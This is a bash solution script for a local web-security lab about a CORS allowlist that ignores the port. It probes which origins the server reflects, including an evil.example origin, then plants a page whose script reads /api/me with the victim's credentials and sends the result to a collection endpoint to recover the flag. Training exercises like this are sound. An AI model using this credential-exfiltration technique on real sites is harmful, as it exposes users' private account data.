#!/usr/bin/env bash
# Lab 23 — a different port is a different origin, and the allowlist stops
# reading before it gets there.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9230}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab23
ID="drop$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# 1. Ask the server what it thinks of each origin. No browser needed for this.
for O in http://evil.example http://127.0.0.1:9231; do
    printf '%-28s ' "$O" >&2
    send "$SESSION" req_0 --create --set path=/api/me --set "header.Origin=$O" |
        grep -i "access-control-allow-origin" >&2 || echo "(no ACAO)" >&2
done

# 2. It reflects 127.0.0.1:9231 with credentials, so a page there can read the
#    response. Publish one and have a signed-in user open it.
PAGE="<html><body><script>
fetch('$URL/api/me',{credentials:'include'})
  .then(r=>r.text())
  .then(t=>fetch('$URL/collect?id=$ID&c='+encodeURIComponent(t)))
</script></body></html>"

send "$SESSION" req_0 --create --set method=POST --set path=/page \
    --set header.Content-Type=application/json \
    --set "json.name=steal$$" --set "json.html=$PAGE" >/dev/null

send "$SESSION" req_0 --create --set method=POST --set path=/report \
    --set header.Content-Type=application/json \
    --set "json.url=http://127.0.0.1:9231/p/steal$$" >/dev/null

for _ in $(seq 1 30); do
    OUT="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
        python3 -c 'import json,sys,urllib.parse
print(" ".join(urllib.parse.unquote(r) for r in json.load(sys.stdin)["rows"]))')"
    [ -n "$OUT" ] && { printf '%s\n' "$OUT" | flag; exit 0; }
    sleep 1
done
echo "no flag found"
